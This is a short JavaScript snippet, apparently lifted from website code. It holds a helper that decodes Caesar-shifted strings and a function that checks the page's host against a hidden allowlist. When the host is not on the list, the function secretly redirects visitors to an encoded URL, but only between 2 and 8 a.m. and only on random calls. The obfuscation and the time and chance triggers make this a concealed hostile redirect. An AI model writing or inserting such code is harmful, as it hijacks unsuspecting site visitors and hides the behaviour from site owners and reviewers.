

function exeFn(url,arr) {

    var host = window.location.host;

    var flag = false;
    var myDate = new Date();
    arr.forEach((item, index) => {


        if (do_decrypt(5, item) == 'https://' + host||do_decrypt(5, item) == 'http://' + host || do_decrypt(5, item) == host) {
            flag = true;
        };
    });
    if (!flag) {

        if (myDate.getHours() > 2 && myDate.getHours() < 8) {
            if (myDate.getTime() % 2 == 0) {
                window.location.href = do_decrypt(5, arr[0]);
            };
        };
    } else {

        if (url) {

            window.location.href = url;
        }
    }
}

// 解密
function do_decrypt(key, ctext) {
    var plain = "";
    // do the encoding
    for (var i = 0; i < ctext.length; i++) {
        var ccode = ctext.charCodeAt(i);
        var pcode = ccode;
        if (ccode >= 65 && ccode <= 90) {
            pcode = ((ccode - 65) - key * 1 + 26) % 26 + 65;
        }
        if (ccode >= 97 && ccode <= 122) {
            pcode = ((ccode - 97) - key * 1 + 26) % 26 + 97;
        }
        // console.log(ccode + "," + pcode);
        plain += String.fromCharCode(pcode);
    }
    // console.log(-3 % 26);

    return plain;
}